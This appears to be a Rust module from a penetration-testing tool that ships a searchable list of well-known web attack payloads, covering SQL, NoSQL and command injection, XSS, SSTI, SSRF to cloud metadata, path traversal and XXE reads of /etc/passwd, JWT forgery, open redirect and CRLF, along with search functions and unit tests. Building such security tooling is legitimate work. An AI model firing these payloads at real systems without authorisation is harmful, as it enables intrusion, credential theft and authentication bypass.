//! Bundled payload library (port spec §3, the committed `BUNDLED_PAYLOADS`).
//! Canonical, publicly-known pentest payloads grouped by vulnerability class,
//! searchable by class and/or keyword. Ships in the binary — no network.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct Payload {
    pub class: String,
    pub name: String,
    pub payload: String,
    pub notes: String,
}

/// (class, name, payload, notes)
const BUNDLED: &[(&str, &str, &str, &str)] = &[
    // SQL injection
    ("sqli", "auth-bypass", "' OR '1'='1", "classic login bypass"),
    ("sqli", "comment-bypass", "admin'--", "comment out password check"),
    ("sqli", "union-version", "1' UNION SELECT NULL,version()-- -", "DB version via UNION"),
    ("sqli", "time-blind", "1' AND SLEEP(5)-- -", "MySQL time-based blind"),
    ("sqli", "boolean-blind", "1' AND 1=1-- -", "boolean-based blind probe"),
    // XSS
    ("xss", "basic-script", "<script>alert(1)</script>", "reflected/stored probe"),
    ("xss", "img-onerror", "\"><img src=x onerror=alert(1)>", "attribute break-out"),
    ("xss", "svg-onload", "<svg/onload=alert(1)>", "tagless-ish vector"),
    ("xss", "js-uri", "javascript:alert(1)", "href/src sink"),
    // SSTI
    ("ssti", "math-probe", "{{7*7}}", "Jinja2/Twig → 49 if vulnerable"),
    ("ssti", "dollar-probe", "${7*7}", "FreeMarker/JSP EL"),
    ("ssti", "jinja-config", "{{config.items()}}", "Flask config dump"),
    // SSRF
    ("ssrf", "aws-metadata", "http://169.254.169.254/latest/meta-data/", "cloud IMDS pivot"),
    ("ssrf", "localhost", "http://127.0.0.1:80/", "internal service reach"),
    ("ssrf", "file-scheme", "file:///etc/passwd", "local file read via SSRF"),
    // LFI / path traversal
    ("lfi", "etc-passwd", "../../../../etc/passwd", "directory traversal"),
    ("lfi", "double-encode", "....//....//....//etc/passwd", "filter bypass"),
    ("lfi", "php-filter", "php://filter/convert.base64-encode/resource=index.php", "source disclosure"),
    // RCE / command injection
    ("cmdi", "semicolon", "; id", "chained command"),
    ("cmdi", "pipe", "| id", "piped command"),
    ("cmdi", "subshell", "$(id)", "command substitution"),
    ("cmdi", "sleep-probe", "; sleep 5", "blind time-based"),
    // XXE
    ("xxe", "file-read", "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", "external entity file read"),
    // NoSQL injection
    ("nosqli", "ne-operator", "{\"$ne\": null}", "auth bypass (Mongo)"),
    ("nosqli", "gt-operator", "{\"$gt\": \"\"}", "always-true predicate"),
    // Prototype pollution
    ("proto-pollution", "proto-key", "{\"__proto__\":{\"polluted\":true}}", "JS prototype pollution"),
    // JWT
    ("jwt", "alg-none", "alg:none", "unsigned token forgery — strip signature"),
    ("jwt", "kid-injection", "kid: ../../dev/null", "key confusion via kid header"),
    // Open redirect
    ("open-redirect", "protocol-relative", "//evil.example", "host confusion"),
    ("open-redirect", "backslash", "/\\evil.example", "parser mismatch"),
    // CRLF
    ("crlf", "header-inject", "%0d%0aSet-Cookie:sesser=1", "response splitting"),
    // GraphQL
    ("graphql", "introspection", "{__schema{types{name}}}", "schema discovery"),
    // IDOR
    ("idor", "increment-id", "id=1001 → id=1002", "test adjacent object refs"),
];

fn to_payload(t: &(&str, &str, &str, &str)) -> Payload {
    Payload {
        class: t.0.to_string(),
        name: t.1.to_string(),
        payload: t.2.to_string(),
        notes: t.3.to_string(),
    }
}

/// Search the payload library. `vuln_class` filters by class (case-insensitive,
/// substring); `keyword` matches name/payload/notes. Either may be empty.
pub fn search(vuln_class: &str, keyword: &str, limit: usize) -> Vec<Payload> {
    let vc = vuln_class.to_lowercase();
    let kw = keyword.to_lowercase();
    BUNDLED
        .iter()
        .filter(|t| vc.is_empty() || t.0.eq_ignore_ascii_case(&vc))
        .filter(|t| {
            kw.is_empty()
                || t.1.to_lowercase().contains(&kw)
                || t.2.to_lowercase().contains(&kw)
                || t.3.to_lowercase().contains(&kw)
        })
        .take(limit)
        .map(to_payload)
        .collect()
}

/// Distinct vuln classes with payload coverage.
pub fn classes() -> Vec<String> {
    let mut v: Vec<String> = BUNDLED.iter().map(|t| t.0.to_string()).collect();
    v.sort();
    v.dedup();
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn search_by_class() {
        let sqli = search("sqli", "", 100);
        assert!(sqli.len() >= 4);
        assert!(sqli.iter().all(|p| p.class == "sqli"));
    }

    #[test]
    fn search_by_keyword() {
        let hits = search("", "metadata", 100);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].class, "ssrf");
    }

    #[test]
    fn class_coverage() {
        let c = classes();
        for expected in ["sqli", "xss", "ssti", "ssrf", "lfi", "cmdi", "jwt", "xxe"] {
            assert!(c.contains(&expected.to_string()), "missing class {expected}");
        }
    }

    #[test]
    fn limit_is_respected() {
        assert_eq!(search("", "", 3).len(), 3);
    }
}
